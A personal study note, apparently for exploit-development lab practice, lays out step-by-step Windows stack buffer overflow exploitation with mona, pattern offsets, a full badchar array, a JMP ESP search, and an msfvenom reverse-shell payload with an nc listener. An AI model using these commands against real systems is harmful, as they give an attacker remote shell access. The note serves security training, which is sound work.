# Buffer Overflow Notes 

If you already know the steps, refer to [[instant-bof.md]]

Required File:
[[fuzzer.md]]
[[exploit.md]]

## Steps

1. Set Base Directory
`!mona config -set workingfolder C:\mona\%p`

2. Search offset using `fuzzer.py`

3. Create Pattern using `msf-pattern_create`
`msf-pattern_create -l *offset*`

4. Change **payload** variable on `exploit.py` to pattern and run script

5. after using script, application should crash, use mona to find real offset. Real offset on EIP offset after running mona
`!mona findmsp -distance *offset*`

6. change **offset** variable to real offset, change **retn** variable to `BBBB`. run script, EIP should be `42424242`

7. Generate badchar on mona. Required to use mona compare 
`!mona bytearray -b "\x00"`

8. Change **payload** variable to badchar
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

9.  run script. view **ESP** address and use mona compare
`!mona compare -f C:\mona\bytearray.bin -a *ESP address*`

10. On mona comparison result, take the first different badchar and remove it from **payload** on python script

11.  Run *step 10* until there is no different badchar on compare

12. Search jump point using mona
`!mona jmp -r esp -cpb *list-badchar*`
example: `!mona jmp -r esp -cpb \x00\x01\x02`

13. Select 1 from the result, and copy address in little endian format
example: if from mona got `12345678`
we should take `\x78\x56\x34\x12`

14. on python script, set **retn** variable to address in little endian format, set **payload** variable to msfvenom result, set padding to `"\x90"*16`
`msfvenom -p windows/shell_reverse_tcp LHOST=*ip* LPORT=4444 EXITFUNC=thread -b "*badchar*" -f python -v payload`
`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.23.168 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v payload`

15. nc listen
`nc -lvnp 4444`

16. Should got reverse shell. If not, try again from step 1






